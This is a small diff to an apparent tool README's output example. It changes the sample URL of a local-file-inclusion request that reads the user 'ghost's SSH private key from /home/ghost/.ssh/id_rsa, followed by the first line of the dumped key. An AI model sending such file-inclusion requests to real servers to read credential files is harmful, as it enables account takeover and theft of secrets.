@@ -28,7 +28,7 @@ Output example:
 ...
 
 > ghost id_rsa private key
-dumped from http://127.0.0.1/index.php?page=/home/ghost/.ssh/id_rsa
+dumped from http://ghost.server/index.php?page=/home/ghost/.ssh/id_rsa
 
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDRScoSFO
